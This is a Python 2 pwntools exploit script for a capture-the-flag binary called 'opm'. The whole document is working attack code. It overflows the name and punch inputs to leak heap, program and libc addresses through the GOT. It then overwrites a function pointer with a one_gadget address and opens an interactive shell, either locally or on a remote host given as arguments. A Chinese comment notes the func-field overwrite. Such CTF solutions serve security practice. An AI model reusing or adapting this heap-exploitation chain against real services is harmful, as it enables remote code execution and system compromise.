#/usr/env/bin python
#-*- coding: utf-8 -*-
from pwn import *
import sys
import os

def add(Name,Punch):
    io.recvuntil('(E)xit\n')
    io.sendline('A')
    io.recvuntil('Your name:\n')
    io.sendline(Name)
    io.recvuntil('N punch?\n')
    io.sendline(Punch)
def show():
    io.recvuntil('(E)xit\n')
    io.sendline('S')
def exploit(flag):
    #leak heap_address
    add('A'*0x70,'0')
    add('B'*0x80+'\x10','1')
    add('C'*0x80,'2'+'C'*(0x80-1)+'\x10')

    io.recvuntil('<')
    io.recvuntil('B'*8)
    heap_base = u64(io.recvuntil('>',drop=True).ljust(0x8,'\x00'))
    log.info('heap_base:'+hex(heap_base))

    #leak proc_base
    add(p64(heap_base-0x1a0),'3'+"D"*0x7f+p64(heap_base+0xc0-0x8))
    io.recvuntil('<')
    proc = u64(io.recvuntil('>',drop=True).ljust(0x8,'\x00'))-0xb30
    log.info('proc_base:'+hex(proc))

    #leak libc_base
    log.info('printf_address:'+hex(proc+elf.got['printf']))
    add(p64(proc+elf.got['printf']+0x8),'4'+"E"*0x7f+p64(heap_base+0x110-0x8))
    io.recvuntil('<')
    puts = u64(io.recvuntil('>',drop=True).ljust(0x8,'\x00'))
    log.info('puts_addr:'+hex(puts))
    libc.address = puts-libc.symbols['puts']
    system = libc.symbols['system']
    binsh = next(libc.search('/bin/sh'))
    #修改role的func字段，直接执行one gadget获取shell
    one_gadget= libc.address+0x4526a
    log.info('system:'+hex(system))
    log.info('/bin/sh:'+hex(binsh))

    #Getshell
    add(p64(one_gadget)+';sh;','5'+"F"*0x7f+p64(heap_base+0x160))
    show()
    io.interactive()

if __name__ == "__main__":
    context.binary = "./opm"
    context.terminal = ['tmux','sp','-h']
    #context.log_level = 'debug'
    elf = ELF('./opm')
    if len(sys.argv)>1:
        io = remote(sys.argv[1],sys.argv[2])
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        exploit(0)
    else:
        io = process('./opm')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        print io.libs()
        libc_base = io.libs()['/lib/x86_64-linux-gnu/libc-2.23.so']
        log.info('libc_base:'+hex(libc_base))
        proc_base = io.libs()[os.getcwd()+'/opm']
        log.info('proc_base:'+hex(proc_base))
        exploit(1)

